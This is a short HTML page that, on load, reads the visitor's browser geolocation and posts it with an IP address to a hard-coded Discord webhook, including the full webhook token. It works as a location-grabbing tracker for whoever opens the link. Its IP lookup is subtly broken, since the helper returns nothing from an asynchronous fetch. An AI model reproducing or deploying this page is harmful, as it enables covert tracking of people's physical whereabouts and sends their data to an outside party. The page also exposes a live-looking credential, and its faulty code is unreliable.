<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location to Discord</title>
    <script>
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1247307482020315198/0pTzDwgH0PSGlr_pjXSXXIofMXjK82K9qVrUfmA8oyAlZE0bQEFOA3Zm8-g86roSOchd';

        function sendLocationToDiscord() {
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = 'เริ่มใช้โค้ด';

            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        const ipAddress = getIPAddress();

                        const message = {
                            content: `Current Location: [Google Maps Link](${googleMapsUrl})\nIPv4 Address: ${ipAddress}`
                        };

                        fetch(discordWebhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(message)
                        })
                        .then(response => response.json())
                        .then(data => console.log('Success:', data))
                        .catch((error) => console.error('Error:', error));
                    }, function(error) {
                        console.error('Error getting location:', error);
                    });
                } else {
                    console.error('Geolocation is not supported by this browser.');
                }
            }, 3000); // นับถอยหลัง 3 วินาที

            // Function to get IPv4 address
            function getIPAddress() {
                fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    console.log('IPv4 Address:', ipAddress);
                    return ipAddress;
                })
                .catch(error => {
                    console.error('Error getting IPv4 address:', error);
                    return 'Unknown';
                });
            }
        }
    </script>
</head>
<body>
    <h1>Send Location to Discord</h1>
    <p>This page will send your current location and IPv4 address to a Discord webhook after 3 seconds.</p>
    <p id="countdown"></p>
    <script>
        // Call the function when the page loads
        sendLocationToDiscord();
    </script>
</body>
</html>
